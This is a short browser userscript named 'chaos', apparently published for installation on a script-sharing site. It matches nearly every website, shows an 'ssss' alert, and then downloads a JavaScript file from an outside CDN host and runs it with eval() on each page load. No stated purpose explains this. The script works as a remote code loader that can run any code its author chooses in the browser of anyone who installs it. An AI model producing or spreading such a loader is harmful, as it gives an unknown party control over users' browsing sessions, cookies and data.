// ==UserScript==
// @name        chaos
// @namespace   Violentmonkey Scripts
// @match       *://*.*.*/*
// @grant       none
// @version     1.005
// @license MIT
// @author      fengmingmin
// @description 2022/8/24 15:00:48
// @require     https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/jquery/3.2.1/jquery.min.js
// @downloadURL https://update.greasyfork.org/scripts/450077/chaos.user.js
// @updateURL https://update.greasyfork.org/scripts/450077/chaos.meta.js
// ==/UserScript==
 alert("ssss");
$(document).ready(function() {
  alert("ssss");
$.get("https://vkceyugu.cdn.bspapp.com/VKCEYUGU-85530a3e-fc46-4ea4-a542-160dad54a088/39385531-4ca3-406d-bb39-d31a31ee1a8f.js",function(data,status){
  eval(data);
  });
});

